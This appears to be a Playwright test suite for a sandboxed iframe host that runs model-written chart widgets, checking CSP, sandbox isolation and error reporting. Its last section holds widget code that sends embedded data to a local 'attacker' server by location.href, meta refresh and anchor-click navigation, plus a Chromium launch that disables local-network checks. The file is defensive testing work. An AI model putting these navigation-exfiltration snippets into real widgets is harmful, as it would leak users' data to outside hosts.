import { createServer, type Server } from "node:http"
import type { AddressInfo } from "node:net"
import { expect, test, type Page } from "@playwright/test"
import { SHELL_CSP } from "../../cloudflare/shell-csp"
import { readChartTheme } from "../../packages/ai/src/lib/chart-theme"
import { WIDGET_SANDBOX, buildWidgetDocument } from "../../packages/ai/src/lib/widget-host"

const theme = readChartTheme(() => "")

// Chromium's Local Network Access checks refuse a navigation from an
// opaque-origin (sandboxed) frame to a loopback address (ERR_BLOCKED_BY_LOCAL_
// NETWORK_ACCESS_CHECKS). The "attacker" server in the exfiltration tests lives
// on loopback, so without this switch the no-header CONTROL would be blocked by
// Chromium itself and could not prove the test detects exfiltration. With it
// off, only the shell CSP stands between the widget and the attacker.
test.use({ launchOptions: { args: ["--disable-features=LocalNetworkAccessChecks,PrivateNetworkAccessForNavigations,BlockInsecurePrivateNetworkRequests"] } })

type Msg = { type: string; height?: number; message?: string }
const msgs = (page: Page) => page.evaluate(() => (window as unknown as { __msgs: Msg[] }).__msgs)

function outerPage(srcdoc: string, dark = false, data: unknown = { principal: 1000 }) {
  const escaped = srcdoc.replace(/&/g, "&amp;").replace(/"/g, "&quot;")
  return `<!doctype html><html class="${dark ? "dark" : ""}"><body>
<script>
  window.__msgs = [];
  window.__parentErrors = [];
  window.addEventListener("error", (e) => window.__parentErrors.push(e.message));
  window.addEventListener("message", (e) => { if (e.source === document.getElementById("f").contentWindow) window.__msgs.push(e.data); });
</script>
<iframe id="f" sandbox="${WIDGET_SANDBOX}" srcdoc="${escaped}" style="width:600px;height:200px"></iframe>
<script>
  document.getElementById("f").addEventListener("load", () => {
    document.getElementById("f").contentWindow.postMessage({ type: "arda:data", data: ${JSON.stringify(data)} }, "*");
  });
</script>
</body></html>`
}

test("widget reads ARDA_DATA and reports height; fetch is blocked by CSP", async ({ page }) => {
  const consoleErrors: string[] = []
  page.on("console", (msg) => {
    if (msg.type() === "error") consoleErrors.push(msg.text())
  })
  const doc = buildWidgetDocument({
    html: `<div id="out" style="height:300px"></div>`,
    js: `window.addEventListener("arda:data", () => {
      document.getElementById("out").textContent = String(window.ARDA_DATA.principal);
      fetch("https://example.com/").catch(() => {});
    });`,
    theme,
  })
  await page.setContent(outerPage(doc))
  await expect.poll(async () => (await msgs(page)).length).toBeGreaterThan(0)
  const received = await msgs(page)
  expect(received.some((m) => m.type === "arda:height" && (m.height ?? 0) >= 300)).toBe(true)
  await expect(page.frameLocator("#f").locator("#out")).toHaveText("1000")
  await expect.poll(() => consoleErrors.some((e) => /Content Security Policy/i.test(e))).toBe(true)
  console.log("[probe] console errors:", JSON.stringify(consoleErrors))
})

test("widget reading ARDA_DATA at top level computes from the data and reacts to a slider", async ({ page }) => {
  // The shape the agent writes for "what-if" tools: read the data once at top
  // level, render, re-render on input. Run at parse time it would show NaN.
  const doc = buildWidgetDocument({
    html: `<input id="rate" type="range" min="5" max="15" step="1" value="9"><div id="out"></div>`,
    js: `var D = window.ARDA_DATA || {};
var principal = D.principal;
var rate = document.getElementById("rate");
function render() { document.getElementById("out").textContent = String(principal * Number(rate.value) / 100); }
rate.addEventListener("input", render);
render();`,
    theme,
  })
  await page.setContent(outerPage(doc))
  const frame = page.frameLocator("#f")
  await expect(frame.locator("#out")).toHaveText("90")
  await frame.locator("#rate").fill("12")
  await expect(frame.locator("#out")).toHaveText("120")
})

test("inline handlers in the html reach functions declared by the widget code", async ({ page }) => {
  // Model html often wires controls with inline handlers. They resolve names
  // in the global scope, so the code must run at top level, not in a wrapper.
  const doc = buildWidgetDocument({
    html: `<input id="rate" type="range" min="5" max="15" step="1" value="9" oninput="render()"><div id="out"></div>`,
    js: `const principal = window.ARDA_DATA.principal;
function render() { document.getElementById("out").textContent = String(principal * Number(document.getElementById("rate").value) / 100); }
render();`,
    theme,
  })
  await page.setContent(outerPage(doc))
  const frame = page.frameLocator("#f")
  await expect(frame.locator("#out")).toHaveText("90")
  await frame.locator("#rate").fill("12")
  await expect(frame.locator("#out")).toHaveText("120")
  expect((await msgs(page)).filter((m) => m.type === "arda:error")).toEqual([])
})

test("a syntax error in widget code surfaces as arda:error and the frame still reports a height", async ({ page }) => {
  const doc = buildWidgetDocument({ html: `<div id="out">x</div>`, js: `function (`, theme })
  await page.setContent(outerPage(doc))
  await expect.poll(async () => (await msgs(page)).some((m) => m.type === "arda:error")).toBe(true)
  expect((await msgs(page)).some((m) => m.type === "arda:height")).toBe(true)
})

test("the arda kit draws a chart that follows a slider, with no NaN and no errors", async ({ page }) => {
  const doc = buildWidgetDocument({
    html: `<input id="rate" type="range" min="5" max="15" value="10"><div id="sum"></div><div id="chart"></div>`,
    js: `arda.live(function () {
  var r = arda.val("rate", 10), p = arda.num(ARDA_DATA.principal, 0);
  arda.set("sum", arda.fmt(p * r / 100, "amount"));
  arda.chart("chart", { type: "bar", categories: ["A", "B", "C"], series: [{ name: "x", values: [p, p * r / 100, ARDA_DATA.missing] }], format: "amount" });
});`,
    theme,
  })
  await page.setContent(outerPage(doc, false, { principal: 500_000_000 }))
  const frame = page.frameLocator("#f")
  await expect(frame.locator("#sum")).toHaveText("50 triệu")
  await expect(frame.locator("#chart svg rect[rx='2']")).toHaveCount(3)
  const before = await frame.locator("#chart svg").innerHTML()
  await frame.locator("#rate").fill("15")
  await expect(frame.locator("#sum")).toHaveText("75 triệu")
  expect(await frame.locator("#chart svg").innerHTML()).not.toBe(before)
  expect(await frame.locator("#chart").innerHTML()).not.toMatch(/NaN|Infinity/)
  expect((await msgs(page)).filter((m) => m.type === "arda:error")).toEqual([])
})

test("a healthy widget produces no arda:error", async ({ page }) => {
  const doc = buildWidgetDocument({ html: `<div id="out"></div>`, js: `1`, theme })
  await page.setContent(outerPage(doc))
  await expect.poll(async () => (await msgs(page)).some((m) => m.type === "arda:height")).toBe(true)
  await page.waitForTimeout(500)
  expect((await msgs(page)).filter((m) => m.type === "arda:error")).toEqual([])
})

test("iframe has no same-origin: cookies, parent DOM and storage are unreachable", async ({ page }) => {
  const doc = buildWidgetDocument({
    html: `<div id="out"></div>`,
    js: `window.addEventListener("arda:data", () => {
      let r = [];
      try { r.push(document.cookie === "" ? "nocookie" : "cookie"); } catch (e) { r.push("cookie-throws"); }
      try { r.push(window.parent.document ? "parent-dom" : "no-parent-dom"); } catch (e) { r.push("parent-blocked"); }
      try { localStorage.getItem("x"); r.push("storage"); } catch (e) { r.push("storage-blocked"); }
      document.getElementById("out").textContent = r.join(",");
    });`,
    theme,
  })
  await page.setContent(outerPage(doc))
  // Without allow-same-origin the frame has an opaque origin: reading
  // document.cookie throws a SecurityError (or would at worst be empty); it must
  // never expose a cookie.
  const out = page.frameLocator("#f").locator("#out")
  await expect(out).toHaveText(/^(nocookie|cookie-throws),parent-blocked,storage-blocked$/)
  console.log("[probe] sandbox probe result:", await out.textContent())
})

test("model errors surface as arda:error, not as parent exceptions", async ({ page }) => {
  const doc = buildWidgetDocument({ html: "", js: `window.addEventListener("arda:data", () => { throw new Error("boom"); });`, theme })
  await page.setContent(outerPage(doc))
  await expect
    .poll(async () => (await msgs(page)).some((m) => m.type === "arda:error" && /boom/.test(m.message ?? "")))
    .toBe(true)
  // Uncaught errors of the iframe are reported by Playwright as page errors but
  // never reach the parent window's own error handler.
  expect(await page.evaluate(() => (window as unknown as { __parentErrors: string[] }).__parentErrors)).toEqual([])
})

test("dark theme tokens change the widget background", async ({ page }) => {
  const light = buildWidgetDocument({ html: "", js: "1", theme: { ...theme, background: "rgb(255, 255, 255)" } })
  const dark = buildWidgetDocument({ html: "", js: "1", theme: { ...theme, background: "rgb(10, 10, 10)" } })
  const bg = () => page.frameLocator("#f").locator("body").evaluate((el) => getComputedStyle(el).backgroundColor)
  await page.setContent(outerPage(light))
  await expect.poll(bg).toBe("rgb(255, 255, 255)")
  await page.setContent(outerPage(dark, true))
  await expect.poll(bg).toBe("rgb(10, 10, 10)")
})

// --- Navigation exfiltration -------------------------------------------------
// WIDGET_CSP cannot stop a sandboxed frame from navigating itself to an
// attacker URL; the embedding page's frame-src (SHELL_CSP) does. These tests
// serve the outer page at a dedicated URL, with or without the real shell
// header, and run a tiny "attacker" HTTP server on a different origin.

const HOST_PATH = "/__widget-host"
const secret = { principal: 1000, note: "secret-payload" }

type Attacker = { port: number; hits: string[]; close: () => Promise<void> }

async function startAttacker(): Promise<Attacker> {
  const hits: string[] = []
  const server: Server = createServer((req, res) => {
    hits.push(req.url ?? "")
    res.writeHead(200, { "Content-Type": "text/html" }).end("<!doctype html><title>attacker</title>")
  })
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve))
  const port = (server.address() as AddressInfo).port
  return {
    port,
    hits,
    close: () => new Promise<void>((resolve) => { server.closeAllConnections(); server.close(() => resolve()) }),
  }
}

// The blocked navigation replaces the frame with an error page, so the widget
// proves it ran by posting a marker to the parent right before it navigates.
const RAN = `parent.postMessage({ type: "probe:ran" }, "*")`

// Each variant: how the widget tries to move its own frame to the attacker.
const variants = {
  "location.href": (leak: string) => ({
    html: `<div id="out"></div>`,
    js: `window.addEventListener("arda:data", () => {
      ${RAN};
      window.location.href = ${JSON.stringify(leak)} + encodeURIComponent(JSON.stringify(window.ARDA_DATA));
    });`,
  }),
  "meta refresh": (leak: string) => ({
    html: `<div id="out"></div><meta http-equiv="refresh" content="0;url=${leak}meta">`,
    js: `${RAN}`,
  }),
  "anchor click": (leak: string) => ({
    html: `<div id="out"></div>`,
    js: `window.addEventListener("arda:data", () => {
      ${RAN};
      var a = document.createElement("a");
      a.href = ${JSON.stringify(leak)} + encodeURIComponent(JSON.stringify(window.ARDA_DATA));
      a.target = "_self";
      document.body.appendChild(a);
      a.click();
    });`,
  }),
} as const

async function serveHost(page: Page, body: string, withShellCsp: boolean) {
  await page.route(`**${HOST_PATH}`, (route) =>
    route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: withShellCsp ? { "Content-Security-Policy": SHELL_CSP } : {},
      body,
    })
  )
}

const VIOLATION = /Refused to frame|violates the following Content Security Policy directive/

let attacker: Attacker
test.beforeEach(async ({}, testInfo) => {
  if (testInfo.title.startsWith("exfil")) attacker = await startAttacker()
})
test.afterEach(async ({}, testInfo) => {
  if (testInfo.title.startsWith("exfil")) await attacker.close()
})

// CONTROL first: without the shell header the leak must be observable, which
// proves the test can detect exfiltration and that the header is what stops it.
for (const [name, make] of Object.entries(variants)) {
  test(`exfil control (${name}) WITHOUT shell CSP: attacker receives the request`, async ({ page }) => {
    const { html, js } = make(`http://127.0.0.1:${attacker.port}/leak?d=`)
    const doc = buildWidgetDocument({ html, js, theme })
    await serveHost(page, outerPage(doc, false, secret), false)
    await page.goto(HOST_PATH)
    await expect.poll(() => attacker.hits.length, { timeout: 10_000 }).toBeGreaterThan(0)
    expect(attacker.hits[0]).toMatch(/^\/leak\?d=/)
    if (name !== "meta refresh") expect(decodeURIComponent(attacker.hits[0])).toContain("secret-payload")
    console.log(`[probe] control ${name}: attacker hits =`, JSON.stringify(attacker.hits))
  })
}

for (const [name, make] of Object.entries(variants)) {
  test(`exfil (${name}) WITH shell CSP: navigation is blocked and nothing leaves`, async ({ page }) => {
    const consoleTexts: string[] = []
    page.on("console", (msg) => consoleTexts.push(msg.text()))
    const { html, js } = make(`http://127.0.0.1:${attacker.port}/leak?d=`)
    const doc = buildWidgetDocument({ html, js, theme })
    await serveHost(page, outerPage(doc, false, secret), true)
    await page.goto(HOST_PATH)

    // The widget really ran (so "zero requests" is not vacuous) ...
    await expect.poll(async () => (await msgs(page)).some((m) => m.type === "probe:ran")).toBe(true)
    // ... and the browser reported the blocked navigation.
    await expect.poll(() => consoleTexts.some((t) => VIOLATION.test(t))).toBe(true)
    expect(consoleTexts.some((t) => /frame-src/.test(t))).toBe(true)

    // Bounded "nothing arrived" wait.
    await page.waitForTimeout(1_500)
    expect(attacker.hits).toEqual([])
    console.log(`[probe] csp ${name}: hits =`, JSON.stringify(attacker.hits), "console =", JSON.stringify(consoleTexts.filter((t) => VIOLATION.test(t))))
  })
}
